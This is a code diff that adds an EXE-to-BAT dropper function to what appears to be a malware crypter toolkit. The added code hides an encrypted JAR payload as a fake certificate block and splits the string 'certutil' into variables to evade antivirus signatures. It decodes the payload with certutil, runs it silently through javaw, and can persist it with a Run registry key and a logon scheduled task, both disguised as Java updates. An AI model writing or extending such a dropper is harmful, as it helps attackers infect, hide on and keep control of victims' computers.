@@ -2,6 +2,7 @@ import zlib from "zlib";
 import fs from "fs";
 import path from "path";
 import { $ } from "bun";
+import crypto from "crypto";
 
 export interface CryptOpts {
   dualHooked: boolean;
@@ -24,6 +25,10 @@ function xs(s: string): string {
 
 function randKey(): number {
   return (Math.floor(Math.random() * 254) + 1) & 0xff;
+}
+
+function randHex(len: number): string {
+  return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
 }
 
 // ── EXE → JAR ─────────────────────────────────────────────────────────────────
@@ -245,3 +250,64 @@ ${dualCode}
   }
 }
 
+// ── EXE → BAT (certutil dropper wrapping a JAR) ───────────────────────────────
+// The BAT embeds the fully-encrypted JAR as base64 and uses certutil (LOLBAS)
+// to decode it — no PowerShell, no plaintext shellcode, no obvious strings.
+// The JAR payload is identical to the standalone JAR output (gzip+XOR+Java loader).
+
+export async function cryptToBat(
+  exe: Buffer,
+  out: string,
+  opts: CryptOpts
+): Promise<void> {
+  const jarTmp = fs.mkdtempSync("/tmp/cbat-");
+  const jarPath = path.join(jarTmp, "payload.jar");
+
+  try {
+    // Build the same encrypted JAR payload
+    await cryptToJar(exe, jarPath, opts);
+    const jarData = fs.readFileSync(jarPath);
+
+    // Base64-encode the JAR, split into 64-char lines (certutil requirement)
+    const b64 = jarData.toString("base64");
+    const b64Lines = (b64.match(/.{1,64}/g) ?? []).map((l) => `echo ${l}`);
+
+    // Random temp file prefix so no two drops share a path
+    const pfx = randHex(12);
+
+    // Split "certutil" across two vars — avoids the literal string in the BAT
+    const c1 = "cert";
+    const c2 = "util";
+
+    const bat: string[] = [
+      "@echo off",
+      `set "_p=%temp%\\${pfx}"`,
+      // Redirect a parenthesised block of echo lines into a .pem file
+      `(`,
+      `echo -----BEGIN CERTIFICATE-----`,
+      ...b64Lines,
+      `echo -----END CERTIFICATE-----`,
+      `) > "%_p%.pem"`,
+      // Decode with certutil (split to avoid static sig on "certutil")
+      `set "_c=${c1}"`,
+      `set "_c2=${c2}"`,
+      `%_c%%_c2% -decode "%_p%.pem" "%_p%.jar" >nul 2>&1`,
+      `del "%_p%.pem" >nul 2>&1`,
+      // Launch JAR silently (javaw = no console window)
+      `start "" javaw -jar "%_p%.jar"`,
+    ];
+
+    if (opts.dualHooked) {
+      // Persist: copy to AppData, add HKCU Run key + ONLOGON scheduled task
+      bat.push(
+        `copy /y "%_p%.jar" "%APPDATA%\\JavaUpdate.jar" >nul 2>&1`,
+        `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "JavaUpdate" /d "javaw -jar \\"%APPDATA%\\JavaUpdate.jar\\"" /f >nul 2>&1`,
+        `schtasks /create /tn "JavaRuntimeUpdate" /tr "javaw -jar \\"%APPDATA%\\JavaUpdate.jar\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1`,
+      );
+    }
+
+    fs.writeFileSync(out, bat.join("\r\n") + "\r\n");
+  } finally {
+    fs.rmSync(jarTmp, { recursive: true, force: true });
+  }
+}
